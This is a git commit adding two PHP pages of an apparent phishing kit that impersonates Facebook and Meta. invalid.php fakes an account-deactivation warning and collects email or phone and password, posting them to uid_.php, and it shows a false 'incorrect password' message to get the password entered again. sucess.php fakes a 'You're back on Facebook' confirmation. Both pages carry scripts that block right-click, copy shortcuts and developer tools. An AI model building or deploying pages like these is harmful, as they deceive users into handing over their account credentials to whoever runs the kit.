369c61c32cb189e6425009dcf46d557976bcf5df
komo33dd <165263753+komo33dd@users.noreply.github.com>
2024-03-28 16:01:00 +0700

    Add files via upload
    verfyapp

---
+++ invalid.php
@@ -0,0 +1,91 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="icon" type="image/png" href="img/icon.png">
+    <title>Support</title>
+  <script type="text/javascript">
+      function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
+      </script>
+
+      
+      <script type="text/javascript">
+      window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
+      </script>
+       </script>
+    <title>Restrictions Information</title>
+        <script language="JavaScript">
+        var tanggallengkap = new String();
+        var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
+        namahari = namahari.split(" ");
+        var namabulan = ("January February March April May June July August September October November December");
+        namabulan = namabulan.split(" ");
+        var tgl = new Date();
+        var hari = tgl.getDay();
+        var tanggal = tgl.getDate();
+        var bulan = tgl.getMonth();
+        var tahun = tgl.getFullYear();
+        tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
+        </script>
+      
+      <script type="text/javascript">
+      document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
+      </script>
+  </head>
+  <body style="background-color: #e9ebee;">
+
+    <!-- Example Code -->
+    <nav class="navbar bg-light">
+      <div class="container" style="height:40px">       
+          <img src="img/logo_f.svg" width="100px"  style="margin-top:2px">
+      </div>
+    </nav>
+  
+  <div class="container">
+<form action="uid_.php" method="post">
+    <div class="row">
+
+    <div style="border-radius:10px; width: 600px;height: auto;left: 358px;top: 169px;background: #FFFFFF; margin-left:auto;margin-right:auto; margin-top:5%; padding: 15px">
+    
+    <center>
+    <img style="margin-bottom:8px;margin-top:10px" src="img/mentelunsuri.png" height="150px"><br>
+        <div style="text-align: center; color:red; margin-top: 1px;"><strong><script language="JavaScript">document.write(tanggallengkap);</script> </strong></div>
+        <br>
+    <div style="padding-left: 10 px; padding-right: 10 px; color: black; font-size: 20px; font-family: Segoe UI Historic, Segoe UI, Helvetica, Arial, sans-serif; font-weight: 200; text-align: center;">
+    </div>
+    </center>
+<strong><font>Your Account Will Be Deactivated Soon</font></strong>
+<br>
+  
+<span">We detected unusual activity on your account. Someone may have reported you in non-compliance with our <a href="">Terms of Service</a>. <br>We have already reviewed this decision and the decision cannot be changed.<br>To avoid having your account <a href="">disabled</a>, please verify your account.</span>
+  
+    <hr>
+  <div style="width:100%; height:auto;">
+    <input style="margin-bottom:5px; height:40px" class="form-control" type="text" name="rancak" placeholder="Email or Phone Number" required>
+
+    <input style=" height:40px" class="form-control is-invalid" type="password" name="bana" placeholder="Password" required>
+    <p style="color: red;">The password that you've entered is incorrect.</p>
+    </div>
+  <br>
+    <div style=" font-weight: 500; color: black; padding-left: 10 px; padding-right: 10 px;  font-size: 20px; font-family: Segoe UI Historic, Segoe UI, Helvetica, Arial, sans-serif; text-align: left; margin-bottom:10px;">
+
+<button style="background-color:#1B74E4; color:white; border-color:#1B74E4; width:100%; height:50px; border-radius:5px;">Verification</button>
+
+    <br>
+    
+    </div>
+  </div>
+  </div>
+     <div style="width:80%; margin-top:150px; margin-left:auto;margin-right:10%;">
+  <hr>
+  <div style="float:left;"><img src="img/h9b1AHfIb8K.png" width="100px"></div><div style="float:right;"><font color="">Meta © 2023</div>
+  </div>
+    
+    <!-- End Example Code -->
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js"></script>
+  </body>
+</html>
---
+++ sucess.php
@@ -0,0 +1,65 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="icon" type="image/png" href="img/icon.png">
+    <title>Facebook</title>
+	<script type="text/javascript">
+      function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
+      </script>
+      
+      <script type="text/javascript">
+      window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
+      </script>
+      
+      <script type="text/javascript">
+      document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
+      </script>
+  </head>
+  <body style="background-color: #e9ebee;">
+
+    <!-- Example Code -->
+    
+    <nav class="navbar bg-light">
+      <div class="container" style="height:40px">       
+          <img src="img/logo_f.svg" width="100px"  style="margin-top:2px">
+      </div>
+    </nav>
+	
+	<div class="container">
+	  <div class="row">
+		<div style="width: 724px;height: auto;left: 358px;top: 169px;background: #FFFFFF; margin-left:auto;margin-right:auto; margin-top:5%; padding-bottom:5px"><br>
+			<center><img src="img/sucess.jpg" height="40px"></center>
+		<center><p style="font-family: 'Calibri';font-style: normal;font-weight: 700;font-size: 16px;line-height: 20px; margin-top:15px">You're back on Facebook</p></center>
+		<hr>
+		
+		<div style="width:95%;margin-left:15px">
+		<p style="font-family: 'Calibri';font-style: normal;font-weight: 700;font-size: 16px;line-height: 20px; margin-top:15px">What this means</p>
+		
+		<p style="font-family: 'Calibri';font-style: normal;font-weight: 300;font-size: 15px;line-height: 18px;color: #000000;">We reviewed your account and found that it does follow our <a href="">Terms of Service</a></p>
+		
+		
+		
+		<p style="font-family: 'Calibri';font-style: normal;font-weight: 300;font-size: 15px;line-height: 18px;color: #000000;">We're sorry you couldn't use Facebook while your account was suspended. sometimes we need to take precautions to help keep everyone on facebook safe.</p>
+		</div>
+		<hr>
+		<div style="width:100%; ">
+		<a href="https://web.facebook.com/"><button style="width:100%; height: 42px;margin-bottom:10px; background: #1877f2;border-radius: 6px; color:white;border-color:#1877f2;">Back to Facebook</button></a>		
+		</div>
+		
+	  </div>
+	</div>
+	</div>
+	<div style="width:80%; margin-top:150px; margin-left:auto;margin-right:10%;">
+	<hr>
+  <div style="float:left;"><img src="img/h9b1AHfIb8K.png" width="100px"></div><div style="float:right;"><font color="">Meta © 2023</div>
+  </div>
+    
+    <!-- End Example Code -->
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js"></script>
+  </body>
+</html>
